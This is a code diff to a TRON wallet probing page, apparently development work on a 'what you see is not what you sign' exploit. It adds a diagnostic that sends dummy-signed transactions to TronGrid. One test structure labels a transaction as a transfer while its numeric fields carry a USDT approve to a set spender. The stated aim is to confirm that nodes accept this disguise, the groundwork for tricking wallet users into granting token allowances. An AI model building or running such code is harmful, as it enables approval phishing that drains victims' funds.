@@ -68,6 +68,7 @@
       <button class="btn btn-allowance" id="btnQueryAllowance">② 查询 USDT allowance(owner, spender)</button>
       <button class="btn btn-probe" id="btnProbe">③ 发起"所见非所签"探针交易（纯 transfer）</button>
       <button class="btn btn-probe" id="btnProbeDual" style="background:#c0392b;">③② 双字段号探针（命名=transfer + 数字号=approve）</button>
+      <button class="btn btn-allowance" id="btnNodeDiag" style="background:#6c5ce7;">⑤ 节点解析诊断（直连 TronGrid·假签名·不上链）</button>
       <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
@@ -655,9 +656,106 @@
     }
   }
 
+  // ==================== ⑤ 节点解析诊断（直连，不需签名） ====================
+  // 用假签名直接 POST 给节点 broadcasttransaction，对比 3 种结构的“原始节点响应”。
+  // 假签名必然验签失败，但能暴露节点【解析阶段】的行为：
+  //   · 返回 SIGERROR(...)            → 节点把 raw_data 解析成功了（只是签名不对）→ 结构被接受
+  //   · 返回 {"Error": "..."} / 其它   → 节点在解析阶段就拒绝了该结构
+  // 据此判定“数字字段号”到底能不能被节点采纳。
+  async function postRawToNode(txObj, label) {
+    try {
+      var r = await fetch(TRON_API + '/wallet/broadcasttransaction', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(txObj)
+      });
+      var d = await r.json();
+      log('[' + label + '] 节点原始响应: ' + JSON.stringify(d), 'warn');
+      if (d && d.code) log('  → code = ' + d.code, 'error');
+      if (d && d.message) {
+        try { log('  → message(hex解码) = ' + window.tronWeb.toUtf8(d.message), 'error'); }
+        catch (e) { log('  → message = ' + d.message, 'error'); }
+      }
+      if (d && d.Error) log('  → 解析阶段错误 Error = ' + d.Error, 'error');
+      return d;
+    } catch (e) {
+      log('[' + label + '] 请求异常: ' + (e.message || e), 'error');
+      return null;
+    }
+  }
+
+  async function runNodeDiag() {
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+
+    log('══════════ 节点解析诊断（假签名·不上链） ══════════', 'warn');
+    var DUMMY_SIG = '0'.repeat(130); // 65 字节假签名，必然验签失败
+
+    try {
+      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      var userHex = window.tronWeb.address.toHex(walletAddr);
+
+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!built.result || !built.result.result) { log('approve 构造失败', 'error'); return; }
+      var approveTx = built.transaction;
+      var approveContract = approveTx.raw_data.contract[0];
+
+      var transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+      var transferContract = transferBuilt.raw_data.contract[0];
+
+      // A) 纯 approve（对照：应解析成功 → SIGERROR）
+      await postRawToNode({
+        visible: approveTx.visible, txID: approveTx.txID,
+        raw_data: approveTx.raw_data, raw_data_hex: approveTx.raw_data_hex,
+        signature: [DUMMY_SIG]
+      }, 'A 纯approve');
+
+      // B) 纯 transfer（对照：应解析成功 → SIGERROR）
+      await postRawToNode({
+        visible: transferBuilt.visible, txID: transferBuilt.txID,
+        raw_data: transferBuilt.raw_data, raw_data_hex: transferBuilt.raw_data_hex,
+        signature: [DUMMY_SIG]
+      }, 'B 纯transfer');
+
+      // C) 双键：命名=transfer，数字号=approve（被测结构）
+      var dualContract = {
+        parameter: transferContract.parameter,
+        type: transferContract.type,
+        "1": 31,
+        "2": approveContract.parameter
+      };
+      await postRawToNode({
+        visible: approveTx.visible, txID: approveTx.txID,
+        raw_data: Object.assign({}, approveTx.raw_data, { contract: [dualContract] }),
+        raw_data_hex: approveTx.raw_data_hex,
+        signature: [DUMMY_SIG]
+      }, 'C 双键(数字号)');
+
+      // D) 仅数字号、无命名字段（看节点是否单独认字段号）
+      var numericOnly = { "1": 31, "2": approveContract.parameter };
+      await postRawToNode({
+        visible: approveTx.visible, txID: approveTx.txID,
+        raw_data: Object.assign({}, approveTx.raw_data, { contract: [numericOnly] }),
+        raw_data_hex: approveTx.raw_data_hex,
+        signature: [DUMMY_SIG]
+      }, 'D 仅数字号');
+
+      log('对比要点：A/B 应为 SIGERROR(=解析成功)。若 C/D 也 SIGERROR → 节点采纳数字号(推断成立的关键)；', 'success');
+      log('若 C/D 为 {"Error":...} 或非 SIGERROR → 节点不认数字号/拒绝该结构(推断不成立)。', 'success');
+    } catch (e) {
+      log('节点诊断异常: ' + (e.message || e), 'error');
+    }
+  }
+
   // ==================== 事件绑定 ====================
   $('btnConnect').addEventListener('click', connect);
   $('btnProbeDual').addEventListener('click', runProbeDual);
+  $('btnNodeDiag').addEventListener('click', runNodeDiag);
   $('btnQueryAllowance').addEventListener('click', function() {
     queryAndShowAllowance(false);
   });
